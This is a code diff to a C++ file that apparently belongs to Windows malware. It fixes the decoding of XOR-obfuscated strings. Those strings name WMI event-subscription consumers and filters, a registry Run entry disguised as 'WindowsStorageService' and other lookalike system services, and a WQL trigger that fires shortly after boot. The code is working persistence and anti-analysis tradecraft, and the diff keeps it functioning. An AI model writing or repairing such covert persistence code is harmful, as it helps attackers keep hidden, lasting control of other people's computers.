@@ -9,19 +9,36 @@
 #include <string>
 #include <vector>
 
-static const wchar_t* WMI_CMD_CONSUMER()    { static auto s = XSW(L"BrokerServicePerf_v2");    return s.str(); }
-static const wchar_t* WMI_SCRIPT_CONSUMER() { static auto s = XSW(L"WinStoreSvcHelper_v3");    return s.str(); }
-static const wchar_t* WMI_FILTER_NAME()     { static auto s = XSW(L"SystemPerfMonitor_v2");    return s.str(); }
-static const wchar_t* REG_RUN_NAME()        { static auto s = XSW(L"WindowsStorageService");   return s.str(); }
-static const wchar_t* WMI_NS_SUB()          { static auto s = XSW(L"ROOT\\subscription");      return s.str(); }
-static const wchar_t* WMI_NS_CIMV2()        { static auto s = XSW(L"ROOT\\CIMV2");             return s.str(); }
+// XorStr::str() XORs buf in-place — static XorStr objects re-encrypt on the
+// second call and return garbage. Pattern: decode once into std::wstring at
+// first call, return c_str() of the persistent copy on all subsequent calls.
+#define DECODE_ONCE(fn, literal)                                              \
+    static const wchar_t* fn() {                                              \
+        static const std::wstring _s = []() -> std::wstring {                \
+            auto _t = XSW(literal); return std::wstring(_t.str());            \
+        }();                                                                  \
+        return _s.c_str();                                                    \
+    }
+
+DECODE_ONCE(WMI_CMD_CONSUMER,    L"BrokerServicePerf_v2")
+DECODE_ONCE(WMI_SCRIPT_CONSUMER, L"WinStoreSvcHelper_v3")
+DECODE_ONCE(WMI_FILTER_NAME,     L"SystemPerfMonitor_v2")
+DECODE_ONCE(REG_RUN_NAME,        L"WindowsStorageService")
+DECODE_ONCE(WMI_NS_SUB,          L"ROOT\\subscription")
+DECODE_ONCE(WMI_NS_CIMV2,        L"ROOT\\CIMV2")
+
+#undef DECODE_ONCE
+
 static const wchar_t* WQL_QUERY() {
-    static auto s = XSW(
-        L"SELECT * FROM __InstanceModificationEvent WITHIN 60 "
-        L"WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' "
-        L"AND TargetInstance.SystemUpTime >= 240 "
-        L"AND TargetInstance.SystemUpTime < 325");
-    return s.str();
+    static const std::wstring _s = []() -> std::wstring {
+        auto _t = XSW(
+            L"SELECT * FROM __InstanceModificationEvent WITHIN 60 "
+            L"WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' "
+            L"AND TargetInstance.SystemUpTime >= 240 "
+            L"AND TargetInstance.SystemUpTime < 325");
+        return std::wstring(_t.str());
+    }();
+    return _s.c_str();
 }
 
 struct CoGuard {
